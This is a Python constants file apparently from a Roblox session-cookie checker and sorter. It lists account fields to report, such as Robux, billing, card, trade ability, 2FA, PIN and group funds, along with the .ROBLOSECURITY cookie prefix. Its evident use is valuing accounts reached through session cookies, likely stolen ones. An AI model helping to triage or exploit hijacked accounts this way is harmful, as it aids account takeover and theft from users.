import json
import typing as t

from src.app.paths import PATH_COUNTRY_CODES


def _load_country_codes() -> dict[str, str]:
    try:
        with PATH_COUNTRY_CODES.open('r', encoding='utf-8') as file:
            data = json.load(file)
    except (FileNotFoundError, OSError, UnicodeError, json.JSONDecodeError):
        return {}
    if not isinstance(data, dict):
        return {}
    raw = t.cast(dict[object, object], data)
    return {str(key): str(value) for key, value in raw.items()}


TIME_FRAME_TRANSACTIONS = 'Year'
ITEMS_PER_PAGE_TRANSACTIONS_ALL_TIME = 100
ITEMS_PER_PAGE_RAP = 100
ITEMS_PER_PAGE_GAMEPASSES = 100
ITEMS_PER_PAGE_FAVORITE_PLACES = 100
ITEMS_PER_PAGE_BUNDLES = 100
ITEMS_PER_PAGE_PLACE_SERVER_IDS = 50
BADGES_COUNT_LIMIT = 100
ROBLOX_COOKIE_CHECKER_MAIN_FIELDS = [
    'Link',
    'ID',
    'Name',
    'Display Name',
    'Country Registration',
    'Registration Date (DMY)',
    'Registration Date (In Days)',
    'Robux',
    'Billing',
    'Pending',
    'Donate (1 Year)',
    'Donate (All Time)',
    'Rap',
    'Card',
    'Premium',
    'Gamepasses',
    'Custom Gamepasses',
    'Badges',
    'Favorite Places',
    'Bundles',
    'Inventory Privacy',
    'Trade Privacy',
    'Can Trade',
    'Sessions',
    'Email',
    'Phone',
    '2FA',
    'Pin',
    'Groups Owned',
    'Groups Members',
    'Groups Pending',
    'Groups Funds',
    'Age Group',
    'Verified Age',
    'Verified Voice',
    'Friends',
    'Followers',
    'Followings',
    'Roblox Badges',
]

ROBLOX_COOKIE_START = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_'
ROBLOX_REG_DATE_FORMAT = '%d.%m.%Y'
ROBLOX_DATE_FORMATS = [
    '%Y-%m-%dT%H:%M:%S.%fZ',
    '%Y-%m-%dT%H:%M:%SZ',
]
DATE_ROBLOX_COOKIE_SORTER_FORMAT = '%d.%m.%Y %H.%M.%S'
ROBLOX_AGE_GROUP_KEYMAP = {
    'over': '+',
    'under': '-',
}
ROBLOX_PRIVACY_KEYMAP = {
    'AllUsers': 'Everyone',
    'FriendsFollowingAndFollowers': 'Friends & Followings & Followers',
    'FriendsAndFollowing': 'Friends & Followings',
    'Friends': 'Friends',
    'NoOne': 'No One',
}

COUNTRY_CODES_KEYMAP = _load_country_codes()
